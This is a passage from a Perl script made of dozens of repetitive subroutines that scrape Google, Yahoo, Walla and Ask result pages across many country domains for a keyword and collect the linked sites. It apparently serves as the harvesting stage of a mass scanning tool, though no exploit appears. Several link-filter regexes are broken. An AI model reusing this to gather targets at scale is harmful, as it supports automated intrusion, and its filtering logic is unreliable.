    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.gr/search?q=".uri_escape($key)."&hl=&cr=countryGR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleGR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleJP() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.jp/search?q=".uri_escape($key)."&hl=&cr=countryJP&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleJP/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cn/search?q=".uri_escape($key)."&hl=&cr=countryCN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleMY() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.my/search?q=".uri_escape($key)."&hl=&cr=countryMY&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMY/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.th/search?q=".uri_escape($key)."&hl=&cr=countryTH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIN() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.in/search?q=".uri_escape($key)."&hl=&cr=countryIN&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleKR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.kr/search?q=".uri_escape($key)."&hl=&cr=countryKR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleKR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleRO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ro/search?q=".uri_escape($key)."&hl=&cr=countryRO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTW() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tw/search?q=".uri_escape($key)."&hl=&cr=countryTW&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTW/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleZA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.za/search?q=".uri_escape($key)."&hl=&cr=countryZA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleZA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pt/search?q=".uri_escape($key)."&hl=&cr=countryPT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub walla() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=100; $b+=1) {
        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /walla\.co\.il/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=1000; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link !~ /yahoo\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CA.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ca&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://UK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=gb&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://DE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=de&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://FR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=fr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://ES.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=es&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://IT.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=it&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooHK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://HK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=hk&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooHK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooID() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://ID.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=id&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooID/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooIN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://IN.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=in&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AU.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=au&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://MX.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=mx&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooMX/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooTW() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://TW.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=tw&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooTW/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://BR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=br&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooBR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ar&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://NL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=nl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooNL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://DK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=dk&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooDK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooPH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PH.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ph&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=cl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://RU.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ru&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooRU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooCH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CH.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ch&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooCO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CO.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=co&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooFI() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://FI.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=fi&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooFI/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooRO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://RO.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ro&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooRO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooVE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://VE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ve&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooVE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AT.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=at&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooPL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=pl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://KR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=kr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooKR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://NZ.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=nz&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooNZ/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooGR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://GR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=gr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooGR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooPE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=pe&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
	my @list;
	my $key = $_[0];
	for (my $i=1; $i<=1000; $i+=100) {
		my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
		my $res = &search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
			if ($link !~ /ask\.com/){
				my @grep = &links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub askCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ca.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askCA\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://de.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askIT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askUK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://fr.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askFR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://es.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askES\.com/){
                my @grep = links($link);
